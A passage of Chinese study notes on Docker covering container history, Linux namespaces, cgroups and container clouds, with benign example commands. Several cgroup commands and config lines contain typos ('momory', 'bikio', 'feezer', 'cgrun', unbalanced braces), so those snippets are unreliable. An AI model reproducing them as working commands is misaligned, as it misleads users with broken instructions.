&lt;containerID&gt;</code><br>通常在容器无响应时使用。<br>与stop的区别：<br>stop给容器的进程发送SIGTERM信号，默认行为是会导致容器退出，当然，容器内程序可以捕获该信号并自行处理，例如可以选择忽略。<br>kill给容器的进程发送SIGKILL信号，该信号将会使容器必然退出。<br>事件查看events<br>容器依附attach<br>容器信息本地查看ps<br>容器停止stop<br>容器创建create<br>容器删除rm<br>容器变化查看diff<br>容器启动run<br>容器启动start<br>容器导入import<br>容器导出export<br>容器提交commit<br>容器日志logs<br>容器暂停pause<br>容器暂停恢复unpause<br>容器更新update<br>容器状态查看stats<br>容器端口port<br>容器进入exec<br>容器进程查看top<br>容器重启restart<br>容器重命名rename<br>拉取镜像pull<br>推送镜像push<br>数据卷管理volume<br>文件复制cp<br>服务管理service<br>登出仓库logout<br>登录仓库login<br>等待设置wait<br>管理节点node<br>网络管理network<br>镜像删除rmi<br>镜像历史查看history<br>镜像导出save<br>镜像搜索search<br>镜像本地查看images<br>镜像构建build<br>镜像标签tags<br>集群管理swarm</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Linux、Windows和Mac OS平台上的Docker操作基本一致。<br>Docker作为一个2013年才诞生的开源项目。</p><h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>容器技术早在Docker之前就有。<br>Docker清晰、易用、用户体验友好。发展迅速、火爆。在容器技术领域有领先地位。国内外有很多创业公司以Docker技术起家，Docker在中国的推广基本上靠国内几家与Docker相关的初创公司。开发者、企业、云计算厂商陆续在用。<br>伴随而来的是各种复杂的需求与Docker尚不算完善的功能所产生的矛盾，这些问题制约着企业容器化的脚步。</p><h1 id="企业级容器云的实战经验"><a href="#企业级容器云的实战经验" class="headerlink" title="企业级容器云的实战经验"></a>企业级容器云的实战经验</h1><h1 id="为什么学习Docker"><a href="#为什么学习Docker" class="headerlink" title="为什么学习Docker"></a>为什么学习Docker</h1><p>简化”换电脑换服务器”等迁移工作的环境配置问题。避免这个程序只有在我的机器上才可以运行的问题。</p><h1 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h1><h2 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h2><p>通过各种虚拟化技术来实现软件的<strong>迁移和分发</strong>，解决了迁移过程中的诸多难题。<br><strong>最常见的就是虚拟机或KVM技术</strong>。在虚拟机里完成<strong>开发再迁移到线上</strong>不会出现环境问题。<br>性能低下、分发流程麻烦、耗时和成本昂贵等问题。在云计算时代这些问题更加突出。传统的软件开发和运维的烦琐流程感到吃力。<br><strong>虚拟化技术</strong>开始普及。</p><h2 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h2><p>低成本、启动快、体积小和分发迅速</p><h3 id="第一代运维"><a href="#第一代运维" class="headerlink" title="第一代运维"></a>第一代运维</h3><p>通过Shell脚本的方式使用SSH连接到所有服务器然后执行相同的指令，并把日志保存起来归档。维护服务器是一项繁重的工作，工程师不得不把大量的时间耗费在<strong>服务器管理</strong>上。</p><h3 id="第二代运维"><a href="#第二代运维" class="headerlink" title="第二代运维"></a>第二代运维</h3><p>虚拟化技术的普及、云计算的出现、企业需要管理的服务器数量大幅增长。数据中心由企业内部发展到全球。运维成本愈发昂贵。<br><strong>运维工具</strong>（如<strong>Ansible、Puppet、SaltStack和Chef</strong>）改变云计算时代服务器运维方式。可以通过这些工具快速地完成对上百台甚至上千台服务器的管理操作。它极大地解决了管理庞大服务器集群的难题，使人们可以在屏幕面前通过一个界面管理所有服务器。但本质上这些工具都是通过SSH或者类似于SSH的方式连接到服务器来管理<strong>服务器集群</strong>。第二代运维和第一代运维并没有发生根本性的改变。</p><h3 id="第三代运维（容器时代）"><a href="#第三代运维（容器时代）" class="headerlink" title="第三代运维（容器时代）"></a>第三代运维（容器时代）</h3><p>前两代运维速度是硬伤。SSH连接来交换信息十分耗时，其他复杂的管理操作更耗时。<br>而随着容器技术的爆发，<strong>以Docker为代表的容器技术</strong>开始发力，并随着DevOps概念的普及，使运维发生了根本性的改变。<br><strong>容器集群管理</strong>不再是通过低效的SSH来连接服务器，甚至不需要登录服务器就可以完成对服务器的管理。<br>通过容器管理集群可以抛弃传统的“SSH+秘钥”的连接方式来连接服务器，这对大规模集群来说是一个极大的变革。<br>而且在速度上，容器技术在上百台服务器上启动应用只需要一眨眼的时间，这使得运维的工作大大减轻。<br>运维和开发在容器时代逐步“融为一体”，形成一个流水线车间的工作环境。这对于软件行业来说无疑是一次巨大的变革。</p><h1 id="镜像的构建、容器的运行监控、网络的管理、仓库的应用、集群的部署"><a href="#镜像的构建、容器的运行监控、网络的管理、仓库的应用、集群的部署" class="headerlink" title="镜像的构建、容器的运行监控、网络的管理、仓库的应用、集群的部署"></a>镜像的构建、容器的运行监控、网络的管理、仓库的应用、集群的部署</h1><h1 id="Docker的基本使用方法与实现原理（内部原理）"><a href="#Docker的基本使用方法与实现原理（内部原理）" class="headerlink" title="Docker的基本使用方法与实现原理（内部原理）"></a>Docker的基本使用方法与实现原理（内部原理）</h1><h1 id="从不同的角度分析问题并提出对应的解决办法"><a href="#从不同的角度分析问题并提出对应的解决办法" class="headerlink" title="从不同的角度分析问题并提出对应的解决办法"></a>从不同的角度分析问题并提出对应的解决办法</h1><h1 id="实战技巧拓展"><a href="#实战技巧拓展" class="headerlink" title="实战技巧拓展"></a>实战技巧拓展</h1><h1 id="根据不同类型的开发环境构建基础开发环境镜像"><a href="#根据不同类型的开发环境构建基础开发环境镜像" class="headerlink" title="根据不同类型的开发环境构建基础开发环境镜像"></a>根据不同类型的开发环境构建基础开发环境镜像</h1><h1 id="直接使用Docker进入测试开发"><a href="#直接使用Docker进入测试开发" class="headerlink" title="直接使用Docker进入测试开发"></a>直接使用Docker进入测试开发</h1><h1 id="根据不同类型的应用部署"><a href="#根据不同类型的应用部署" class="headerlink" title="根据不同类型的应用部署"></a>根据不同类型的应用部署</h1><h1 id="Docker分别在Linux、Windows和Mac-OS系统下的安装方法，以及二进制安装方法。"><a href="#Docker分别在Linux、Windows和Mac-OS系统下的安装方法，以及二进制安装方法。" class="headerlink" title="Docker分别在Linux、Windows和Mac OS系统下的安装方法，以及二进制安装方法。"></a>Docker分别在Linux、Windows和Mac OS系统下的安装方法，以及二进制安装方法。</h1><h1 id="Docker基础知识"><a href="#Docker基础知识" class="headerlink" title="Docker基础知识"></a>Docker基础知识</h1><h2 id="Docker的基本操作"><a href="#Docker的基本操作" class="headerlink" title="Docker的基本操作"></a>Docker的基本操作</h2><p>Docker基础、Docker镜像、Docker file文件、Docker仓库、Docker容器、数据卷的使用方法与原理及网络管理</p><h2 id="简单应用，等内容。通过对本篇内容的学习，读者可以掌握最常用的Docker知识。"><a href="#简单应用，等内容。通过对本篇内容的学习，读者可以掌握最常用的Docker知识。" class="headerlink" title="简单应用，等内容。通过对本篇内容的学习，读者可以掌握最常用的Docker知识。"></a>简单应用，等内容。通过对本篇内容的学习，读者可以掌握最常用的Docker知识。</h2><h1 id="Docker进阶实战（在实际开发中的应用实例）"><a href="#Docker进阶实战（在实际开发中的应用实例）" class="headerlink" title="Docker进阶实战（在实际开发中的应用实例）"></a>Docker进阶实战（在实际开发中的应用实例）</h1><p>操作系统、编排工具Compose、Web服务器与应用、数据库、编程语言、Docker API、私有仓库、集群网络、Docker安全<br>Docker在容器云环境中的应用<br>在实际生产环境中应用Docker</p><h1 id="容器技术大观"><a href="#容器技术大观" class="headerlink" title="容器技术大观"></a>容器技术大观</h1><p>容器，用来放东西的道具。容器技术借鉴了工业运输的发展经验。低成本，标准化。<br>虚拟化技术分类：</p><ul><li>基于<strong>硬件</strong>虚拟化，基于<strong>软件</strong>虚拟化。</li><li><strong>硬件</strong>虚拟化、<strong>半</strong>虚拟化和<strong>操作系统</strong>虚拟化。<br>虚拟化技术分类： <strong>应用</strong>虚拟化（如Wine）和<strong>平台</strong>虚拟化（如虚拟机）<blockquote><p>硬件虚拟化并不多见，大都是半虚拟化与软件结合，应用较为广泛的则是基于软件的虚拟化技术。<br>容器技术属于操作系统虚拟化，属于平台虚拟化的一种。<br>Docker∈容器技术∈操作系统虚拟化。有时这种分类会因为技术的发展而有变动。其相较于其他主流虚拟化技术更轻量。</p></blockquote></li></ul><p>同样，软件行业的容器技术也是在尝试打造一套标准化的软件构建、分发流程，以降低运维成本，提高软件安全与运行稳定等。与工业运输的集装箱不同，容器技术要复杂得多。它不仅仅是要打造一个运输用的“集装箱”，还要保证软件在容器内能够运行，在操作系统上打造一个“独立的箱子”。这需要解决文件系统、网络、硬件等多方面的问题。经过长时间的发展，容器技术已经逐步成熟，并在Docker的诞生下迎来它的繁荣时代。<br>读者大可把容器理解为一个沙盒，每个容器是独立的，容器之间可以相互通信。</p><p>与传统软件行业的开发和运维相比，容器虚拟化可以更高效地构建应用，也更容易管理维护。举个简单的例子，常见的LAMP组合开发网站，按照传统的做法自然是各种安装，然后配置、测试、发布，中间麻烦事一大堆，相信不少读者深有体会。<br>当服务器需要搬迁时，往往需要再执行一次以前的部署步骤，极大地浪费了运维人员的时间。最可怕的是搬迁后往往因为一些不可预知的原因而导致软件无法正常运行，只能一头扎进代码中找Bug。<br>如果使用了容器技术，运维只需要一句简单的命令即可部署一整套LAMP环境，并且不需要复杂的配置与测试。即便搬迁也只是打包传输即可。即使在另一台机器上，软件也不会出现“水土不服”的情况。这无疑节约了运维人员的大量时间。<br>而对于开发者来说，一处构建，到处运行，大概是梦寐以求的事情。这也是很多跨平台语言的宣传标语之一。但不管是怎样的跨平台语言，在很多细节上都需要不少调整才能运行在另一个平台上。但容器技术则不一样，开发者可以使用熟悉的编程语言开发软件，之后用容器技术打包构建，便可以一键运行在所有支持该容器技术的平台上。<br>容器技术具有更快的交付和部署速度，而且相较于其他虚拟化技术，容器技术更加轻量。</p><p>软件行业上的容器是从文件系统隔离开始的。最早的容器技术大概是chroot（1979年）了，它最初是一个UNIX操作系统上的系统调用，用于将一个进程及其子进程的根目录改变到文件系统中的一个新位置，让这些进程只能访问到该目录。直到今天，主流Linux上还有这个工具。<br>打开一个终端，输入chroot–help，查看一下这个古老的命令。<br>$ chroot ——help<br>用法：chroot [选项] 新根 [命令 [参数]……]<br>或：chroot 选项<br>以指定的新根为运行指定命令时的根目录。<br>——userspec=用户:组 指定所用的用户及用户组(可使用“数字”或“名字”)<br>——groups=组列表 指定可供选择的用户组列表，形如组1，组2，组3……<br>——help 显示此帮助信息并退出<br>——version 显示版本信息并退出<br>If no command is given, run ‘${SHELL} -i’ (default：’/bin/sh -i’).<br>请向<a href="mailto:bug-coreutils@gnu.org" target="_blank" rel="noopener">bug-coreutils@gnu.org</a> 报告chroot 的错误<br>GNU coreutils 的主页：<br>GNU 软件一般性帮助：<br>要获取完整文档，请运行：info coreutils ‘chroot invocation’<br>chroot这个命令主要用来把用户的文件系统根目录切换到指定的目录下，实现简单的文件系统隔离。可以说chroot的出现是为了提高安全性，但这种技术并不能防御来自其他方面的攻击，黑客依然可以逃离设定访问宿主机上的其他文件。</p><p>容器技术的发展<br>2000年，由R&amp;D Associates公司的Derrick T.Woolworth为FreeBSD引入的FreeBSD Jails成为了最早的容器技术之一。与chroot不同的是，它可以为文件系统、用户、网络等的隔离增加进程沙盒功能。因此，它可以为每个jail指定IP地址，可以对软件的安装和配置进行定制等。<br>紧接着出现了Linux VServer，这是另外一种jail机制，用于对计算机系统上的资源（如文件系统、CPU处理时间、网络地址和内存等）进行安全划分。每个所划分的分区叫做一个安全上下文（Security Context），在其中的虚拟系统叫做虚拟私有服务器（Virtual Private Server，VPS）。<br>在2004和2005年期间分别出现了Solaris Containers和OpenVZ技术，在可控性和便捷性上更胜一筹，如图1.3所示。<br>￼<br>图1.3 常见的容器技术<br>到了2006年，Google公司公开了Process Containers技术，用于对一组进程进行限制、记账、隔离资源（CPU、内存、磁盘I/O、网络等）。后来为了避免和Linux内核上下文中的“容器”一词混淆，而改名为Control Groups（简写为Groups）。2007年被合并到了Linux2.6.24内核中。<br>在前面Cgroups等技术出现以后，容器技术有了更快的发展。如图1.4给出了容器技术的发展史。</p><p>图1.4 容器技术发展史<br>2008年出现了LXC（LinuX Containers），它是第一个最完善的Linux容器管理器的实现方案，是通过Cgroups和Linux名字空间namespace实现的。LXC存在于liblxc库中，提供了各种编程语言的API实现。与其他容器技术不同的是，LXC可以工作在普通的Linux内核上，而不需要增加补丁。<br>LXC的出现为后面一系列工具的出现奠定了基础。2011年CloudFoundry发布了Warden。不像LXC，Warden并不紧密耦合到Linux上，而是可以工作在任何可以提供隔离环境的操作系统上。它以后台守护进程的方式运行，为容器管理提供了API。<br>在2013年，Google公司发布了Lmctfy，它是一个Google容器技术的开源版本，提供Linux应用容器。Google启动这个项目，旨在提供性能可保证的、高资源利用率的、资源共享的、可超售的、接近零消耗的容器。Lmctfy首次发布于2013年10月。到了2015年，Google公司决定贡献其核心的Lmctfy概念，并抽象成libcontainer。现在为Kubernetes所用的cAdvisor工具就是从Lmctfy项目的成果开始的。<br>libcontainer项目最初由Docker发起，现在已经被移交给了开放容器基金会（Open Container Foundation）。<br>同年，dotCloud发布了Docker（Logo是一条鲸鱼驮着一堆集装箱，如图1.5所示）——至今最流行和使用最广泛的容器管理系统。在LXC的基础上，Docker进一步优化了容器的使用体验，使得容器更容易操作和管理。</p><p>Docker提供了从构建、运行、管理、监控等一系列工具，引入了一整个管理容器的生态系统，包括高效分层的容器镜像模型、全局和本地的容器注册库、清晰的REST API、命令行等。这是Docker与其他容器平台最大的不同。在如图1.6中可以看到Docker跨越了多个层面，整合了一系列零散的工具从而达到一系列便捷的操作。这是当时Docker从众多容器技术中脱颖而出的一个重要原因。<br>￼</p><p>围绕Docker的生态系统更有数不胜数的工具，极大地方便了开发者使用容器技术。关于Docker的更多特性，将在第2章介绍。<br>Docker开始阶段使用的也是LXC，之后采用自己开发的libcontainer替代了LXC。<br>之后出于各种原因，CoreOS启动项目Rocket，非常类似于Docker，但是修复了一些Docker中发现的问题。与Docker相比，Rocket是在一个更加开放的标准App Container规范上实现的。现今不少容器管理工具都支持Rocket与Docker。<br>2015年微软公司也在Windows Server上为其基于Windows的应用添加了容器支持，称之为Windows Containers，与Windows Server 2016一同发布。通过该实现，Docker可以原生地在Windows上运行Docker容器，而不需要启动一个虚拟机来运行Docker（Windows上早期运行Docker需要使用Linux虚拟机）。同年，Mac OS也原生支持运行Docker容器。如图1.7所示为官网给出的下载按钮。至此Docker完成了三大平台的适配。</p><p>容器虚拟化技术经过几十年不断的发展与完善，相继加入了pivot_root等很多技术。市场上也出现了一些商业化的容器技术公司。在这些公司与全球开发者的共同努力下，容器技术得到不断推进和发展。最后核心容器技术进入了Linux的内核主线，再后来诸多大厂加入开发的libcontainer，使得如今人人皆可得心应手地操作容器。<br>1.3 容器的原理</p><p>前文提到，容器的核心技术是Cgroups与namespace，在此基础上还有一些其他工具共同构成容器技术。容器本质上是宿主机上的进程。容器技术通过namespace实现资源隔离，通过Cgroups实现资源控制，通过rootfs实现文件系统隔离，再加上容器引擎自身的特性来管理容器的生命周期。<br>简单来说，本书所说的Docker的早期其实就相当于LXC的管理引擎，LXC是Cgroups的管理工具，Cgroups是namespace的用户空间管理接口。namespace是Linux内核在task_struct中对进程组管理的基础机制。</p><p>1.3.1 从namespace说起<br>想要实现资源隔离，第一个想到的就是chroot命令。通过它可以实现文件系统隔离，这是最早的容器技术。但是在分布式的环境下，容器必须要有独立的IP、端口和路由等，自然就有了网络隔离。同时，进程通信隔离、权限隔离等也需要考虑到，因此基本上一个容器需要做到6项基本隔离，也就是Linux内核中提供的6种namespace隔离，如表1.1所示。<br>表1.1 namespace说明</p><p>当然，一项完善的容器技术还需要处理很多工作。<br>对namespace的操作主要是通过clone()、setns()、unshare()这3个系统调用来完成的。<br>clone()可以用来创建新的namespace。clone()有一个flags参数，该参数以CLONE_NEW<em>为格式，包括CLONE_NEWNS、CLONE_NEWIPC、CLONE_NEWUTS、CLONE_NEWNET、CLONE_NEWPID和CLONE_NEWUSER，通过传入这些参数后，由clone()创建出来的新进程就位于新的namespace之中了。<br>因为Mount namespace是第一个实现的namespace，当初实现没有考虑到还有其他namespace的出现，因此用了CLONE_NEWNS的名字，而不是CLONE_NEWMNT之类的名字。其他CLONE_NEW</em>都可以看名字知用途。<br>那么，如何为已有的进程创建新的namespace呢？这就需要用到unshare()了，使用unshare()调用的进程会被放进新的namespace里面。而setns()则是将进程放到已有的namespace中，docker exec命令的实现原理就是setns()。<br>事实上，开发namespace的主要目的之一就是实现轻量级虚拟化服务，在同一个namespace下的进程可以彼此响应，而对外界进程隔离，这样在一个namespace下，进程仿佛处于一个独立的系统环境中，以达到容器的目的。<br>上面介绍的是一些概念，下面来实践一下。因为user namespace是在Linux内核3.8之后才支持的，所以本节讨论的namespace均是3.8以后的版本。</p><p>在了解namespace API之前，先来了解如何查看进程的namespace。在root用户模式下执行：</p><h1 id="ls-l-proc-ns"><a href="#ls-l-proc-ns" class="headerlink" title="ls -l /proc/$$/ns"></a>ls -l /proc/$$/ns</h1><p>total 0<br>lrwxrwxrwx 1 root root 0 6月 10 20:29 ipc -&gt; ipc:[4026531839]<br>lrwxrwxrwx 1 root root 0 6月 10 20:29 mnt -&gt; mnt:[4026531840]<br>lrwxrwxrwx 1 root root 0 6月 10 20:29 net -&gt; net:[4026531956]<br>lrwxrwxrwx 1 root root 0 6月 10 20:29 pid -&gt; pid:[4026531836]<br>lrwxrwxrwx 1 root root 0 6月 10 20:29 user -&gt; user:[4026531837]<br>lrwxrwxrwx 1 root root 0 6月 10 20:29 uts -&gt; uts:[4026531838]<br>这里的$$是指当前进程ID号。可以看到诸如4026531839这样的数字，表示当前进程指向的namespace。当两个进程指向同一串数字时，表示它们处于同一个namespace下。</p><p>使用clone()创建新的namespace<br>创建一个namespace的方法是使用clone()系统调用，它会创建一个新的进程。为了说明创建的过程，给出clone()的原型如下：<br>int clone(int(<em>child_func)(void </em>), void <em>child_stack, int flags, void</em>arg);<br>本质上，clone()是一个通用的fork()版本。fork()的功能由flags参数控制。总的来说，约有超过20个不同的CLONE_<em>标志控制clone()提供不同的功能，包括父子进程是否共享如虚拟内存、打开的文件描述符和子进程等资源。如果调用clone()时设置了一个CLONE_NEW</em>标志，一个与之对应的新的命名空间将被创建，新的进程属于该命名空间。可以使用多个CLONE_NEW<em>标志的组合。<br>3．使用setns()关联一个已经存在的namespace<br>当一个namespace没有进程时还保持其打开，这么做是为了后续添加进程到该namespace。而添加这个功能就是使用setns()系统调用来完成，这使得调用的进程能够和namespace关联，docker exec就需要用到这个方法：<br>int setns(int fd, int nstype);<br>·fd参数指明了关联的namespace，其指向了\proc\PID\ns目录下一个符号链接的文件描述符。可以通过打开这些符号链接指向的文件或者打开一个绑定到符号链接的文件来获得文件描述符。<br>·nstype参数运行调用者检查fd指向的命名空间的类型，如果这个参数等于数，将不会检查。当调用者已经知道namespace的类型时这会很有用。当nstype被赋值为CLONE_NEW</em>的常量时，内核会检查fd指向的namespace的类型。<br>要把namespace利用起来，还要使用execve()函数（或者其他的exec()函数），使得我们能够构建一个简单但是有用的工具，该函数可以执行用户命令。</p><p>使用unshare()在已有进程上进行namespace隔离<br>unshare()和clone()有些像，不同的地方是前者运行在原有进程上，相当于跳出原来namespace操作，Linux自带的unshare()就是通过调用unshare()这个API来实现的。<br>$ unshare<br>Usage:<br>unshare [options] [args……]<br>-h, ——help usage information (this)<br>-m, ——mount unshare mounts namespace<br>-u, ——uts unshare UTS namespace (hostname etc)<br>-i, ——ipc unshare System V IPC namespace<br>-n, ——net unshare network namespace<br>For more information see unshare(1).<br>由于Docker没有使用这个系统调用，所以不展开。除此之外，像fork()这样的函数也可以实现namespace隔离，但并不属于namespace API的一部分。有兴趣的读者可以扫描以下二维码阅读相关资料。</p><p>认识Cgroups<br>Cgrous是Linux内核提供的一种可以限制、记录、隔离进程组（process groups）所使用的物理资源（如CPU，内存，I/O等）的机制。最初由Google公司的工程师提出，后来被整合进Linux内核。Cgroups也是LXC为实现虚拟化所使用的资源管理手段，可以说没有Cgroups就没有LXC。<br>目前，Cgroups有一套进程分组框架，不同资源由不同子系统控制。一个子系统就是一个资源控制器，比如CPU子系统就是控制CPU时间分配的一个控制器。子系统必须附加（attach）到一个层级上才能起作用，一个子系统附加到某个层级以后，这个层级上的所有控制族群（control groups）都受到这个子系统的控制。<br>Croups各个子系统作用如下。<br>·Blkio：为块设备设定输入/输出限制，比如物理设备（磁盘、固态硬盘、USB等）。<br>·Cpu：提供对CPU的Cgroups任务访问。<br>·Cpuacct：生成Cgroups中任务所使用的CPU报告。<br>·Cpuset：为Cgroups中的任务分配独立CPU（在多核系统）和内存节点。<br>·Devices：允许或者拒绝Cgroups中的任务访问设备。<br>·Freezer：挂起或者恢复Cgroups中的任务。<br>·Memory：设定Cgroups中任务使用的内存限制，并自动生成由那些任务使用的内存资源报告。<br>·Net_cls：使用等级识别符（classid）标记网络数据包，可允许Linux流量控制程序（tc）识别从具体Cgroup中生成的数据包。<br>·Net_prio：设置进程的网络流量优先级。<br>·Huge_tlb：限制HugeTLB的使用。<br>·Perf_event：允许Perf工具基于Cgroups分组做性能监测。<br>这样说理解起来也很吃力，下面就通过命令来挂载Cgroupfs。</p><h1 id="mount-t-cgroup-o-cpuset-cpuset-sys-fs-cgroup-cpuset"><a href="#mount-t-cgroup-o-cpuset-cpuset-sys-fs-cgroup-cpuset" class="headerlink" title="mount -t cgroup -o cpuset cpuset /sys/fs/cgroup/cpuset"></a>mount -t cgroup -o cpuset cpuset /sys/fs/cgroup/cpuset</h1><p>这个动作一般情况下已经在Linux启动的时候做了。<br>查看Cgroupfs：</p><h1 id="cpuset-ls"><a href="#cpuset-ls" class="headerlink" title="cpuset ls"></a>cpuset ls</h1><p>cgroup.clone_children cpuset.memory_pressure_enabled</p><p>cgroup.procs cpuset.memory_spread_page<br>cgroup.sane_behavior cpuset.memory_spread_slab<br>cpuset.cpu_exclusive cpuset.mems<br>cpuset.cpus cpuset.sched_load_balance<br>cpuset.effective_cpus cpuset.sched_relax_domain_level<br>cpuset.effective_mems docker<br>cpuset.mem_exclusive notify_on_release<br>cpuset.mem_hardwall release_agent<br>cpuset.memory_migrate tasks<br>cpuset.memory_pressure</p><p>主流Linux发行版下，都可以通过/etc/cgconfig.conf或者cgroup-bin的相关指令来配置Cgroups。<br>mount {<br>cpuset = /sys/fs/cgroup/cpuset;<br>momory = /sys/fs/cgroup/momory;<br>}<br>group cnsworder/test {<br>perm {<br>task {<br>uid = root;<br>gid = root;<br>}<br>admin {<br>uid = root;<br>gid = root;<br>}<br>}</p><p>cpu.shares = 1000;<br>}<br>}<br>然后通过命令行把一个进程移动到这个Cgroups之中。</p><h1 id="mount-t-group-o-cpu-cpu-sys-fs-cgroup-cpuset"><a href="#mount-t-group-o-cpu-cpu-sys-fs-cgroup-cpuset" class="headerlink" title="mount -t group -o cpu cpu /sys/fs/cgroup/cpuset"></a>mount -t group -o cpu cpu /sys/fs/cgroup/cpuset</h1><h1 id="cgcreate-g-cpu-momory-cnsworder"><a href="#cgcreate-g-cpu-momory-cnsworder" class="headerlink" title="cgcreate -g cpu,momory:/cnsworder"></a>cgcreate -g cpu,momory:/cnsworder</h1><h1 id="chown-root-root-sys-fs-cgroup-cpuset-cnsworder-test"><a href="#chown-root-root-sys-fs-cgroup-cpuset-cnsworder-test" class="headerlink" title="chown root:root /sys/fs/cgroup/cpuset/cnsworder/test/*"></a>chown root:root /sys/fs/cgroup/cpuset/cnsworder/test/*</h1><h1 id="chown-root-root-sys-fs-cgroup-cpuset-cnsworder-test-task"><a href="#chown-root-root-sys-fs-cgroup-cpuset-cnsworder-test-task" class="headerlink" title="chown root:root /sys/fs/cgroup/cpuset/cnsworder/test/task"></a>chown root:root /sys/fs/cgroup/cpuset/cnsworder/test/task</h1><h1 id="cgrun-g-cpu-momory-cnsworder-test-bash"><a href="#cgrun-g-cpu-momory-cnsworder-test-bash" class="headerlink" title="cgrun -g cpu,momory:/cnsworder/test bash"></a>cgrun -g cpu,momory:/cnsworder/test bash</h1><p>容器的创建<br>前面只是非常简单地介绍了namespace和Cgroups两个概念。实际上各个namespace的具体介绍与各个Cgroups子系统的介绍都没有深入讲解到，但通过前面两节的学习，相信读者已经大致有了容器创建过程的雏形。<br>（1）系统调用clone()创建新进程，拥有自己的namespace。<br>该进程拥有自己的pid、mount、user、net、ipc和uts namespace。</p><h1 id="pid-clone-fun-stack-flags-clone-arg"><a href="#pid-clone-fun-stack-flags-clone-arg" class="headerlink" title="pid =clone(fun,stack,flags,clone_arg);"></a>pid =clone(fun,stack,flags,clone_arg);</h1><p>（2）将pid写入Cgroup子系统这样就受到Cgroups子系统控制。</p><h1 id="echo-pid-gt-sys-fs-cgroup-cpu-tasks"><a href="#echo-pid-gt-sys-fs-cgroup-cpu-tasks" class="headerlink" title="echo$pid &gt;/sys/fs/cgroup/cpu/tasks"></a>echo$pid &gt;/sys/fs/cgroup/cpu/tasks</h1><h1 id="echo-pid-gt-sys-fs-cgroup-cpuset-tasks"><a href="#echo-pid-gt-sys-fs-cgroup-cpuset-tasks" class="headerlink" title="echo$pid &gt;/sys/fs/cgroup/cpuset/tasks"></a>echo$pid &gt;/sys/fs/cgroup/cpuset/tasks</h1><h1 id="echo-pid-gt-sys-fs-cgroup-bikio-tasks"><a href="#echo-pid-gt-sys-fs-cgroup-bikio-tasks" class="headerlink" title="echo$pid &gt;/sys/fs/cgroup/bikio/tasks"></a>echo$pid &gt;/sys/fs/cgroup/bikio/tasks</h1><h1 id="echo-pid-gt-sys-fs-cgroup-memory-tasks"><a href="#echo-pid-gt-sys-fs-cgroup-memory-tasks" class="headerlink" title="echo$pid &gt;/sys/fs/cgroup/memory/tasks"></a>echo$pid &gt;/sys/fs/cgroup/memory/tasks</h1><h1 id="echo-pid-gt-sys-fs-cgroup-devices-tasks"><a href="#echo-pid-gt-sys-fs-cgroup-devices-tasks" class="headerlink" title="echo$pid &gt;/sys/fs/cgroup/devices/tasks"></a>echo$pid &gt;/sys/fs/cgroup/devices/tasks</h1><h1 id="echo-pid-gt-sys-fs-cgroup-feezer-tasks"><a href="#echo-pid-gt-sys-fs-cgroup-feezer-tasks" class="headerlink" title="echo$pid &gt;/sys/fs/cgroup/feezer/tasks"></a>echo$pid &gt;/sys/fs/cgroup/feezer/tasks</h1><p>（3）通过pivot_root系统调用，使进程进入一个新的rootfs，之后通过exec()系统调用，在新的namespace、Cgroups、rootfs中执行/bin/bash。<br>fun(){<br>pivot_root(“path_of_rootfs/“，path)；<br>exec(“/bin/bash”);<br>}<br>通过上面的操作，成功地在一个容器中运行了/bin/bash。<br>1.4 容器云<br>每一项技术成熟后都会衍生出一系列技术，例如当Docker推开容器世界的大门时，围绕容器技术的生态系统迅速发展起来。<br>无论是<strong>个人</strong>还是<strong>企业</strong>，在使用上都有各种各样的需求，例如<strong>跨主机连接</strong>容器，各种类型的<strong>负载均衡</strong>，<strong>持续构建、集成和交付</strong>，以及<strong>大规模容器管理</strong>等。<br>虽然Docker提供了较为便捷的操作方式，</p><h2 id="Docker的不足"><a href="#Docker的不足" class="headerlink" title="Docker的不足"></a>Docker的不足</h2><p>在<strong>开发、生产环境</strong>中，<strong>网络、存储、集群和高可用</strong>等问题层出不穷。仅凭Docker难以面面俱到。</p><h2 id="Docker的发展方向"><a href="#Docker的发展方向" class="headerlink" title="Docker的发展方向"></a>Docker的发展方向</h2><p>从容器到容器云。围绕Docker容器云还有很多需要开发者去完善的地方。</p><h2 id="Docker生态区"><a href="#Docker生态区" class="headerlink" title="Docker生态区"></a>Docker生态区</h2><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>国内现在以Docker容器云为“卖点”的初创公司不在百家之下，国外更是不用言说。<br>可见如图1.8展示了目前Docker的生态圈的一部分。<br>可以看到这些工具围绕Docker进行扩展补充，已经形成了非常发达的生态系统网络。<br>图1.8 容器技术生态圈</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="容器云"><a href="#容器云" class="headerlink" title="容器云"></a>容器云</h2><p>容器云是以容器为资源分割和调度的基本单位，通过容器封装软件运行环境，为用户提供一个集构建、发布和运行于一体的分布式应用平台。</p><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>微服Microservices在软件架构上可以将容器用于部署。微服务只是一个相比标准的Web服务超快的<strong>轻量级Web服务</strong>。这是通过将功能单元（也许是一个单一服务或API方法）打包到一个服务中，并内嵌其到一个轻量级Web服务器软件中实现的。</p><h2 id="容器云与IaaS、PaaS"><a href="#容器云与IaaS、PaaS" class="headerlink" title="容器云与IaaS、PaaS"></a>容器云与IaaS、PaaS</h2><p>容器云可以共享与隔离资源、编排与部署容器。在这一点上容器云与IaaS相似。<br>但是容器云也可以渗透到应用支撑与运行时环境，在这一点上与PaaS类似。</p><h2 id="Docker与其他容器技术"><a href="#Docker与其他容器技术" class="headerlink" title="Docker与其他容器技术"></a>Docker与其他容器技术</h2><p>容器技术<br>基础：Docker、CoreOS的Rocket项目等等。<br>发展：容器云。<br>突破性发展：微服务（Microservices）、Serverless。Docker与微服务结合开辟了新蓝海。<br>容器基本概念<br>容器运行原理<br>容器调用方法<br>容器技术的历史<br>Docker Swarm集群管理方式</p><h1 id="容器技术与Docker（Docker在容器技术中的位置）"><a href="#容器技术与Docker（Docker在容器技术中的位置）" class="headerlink" 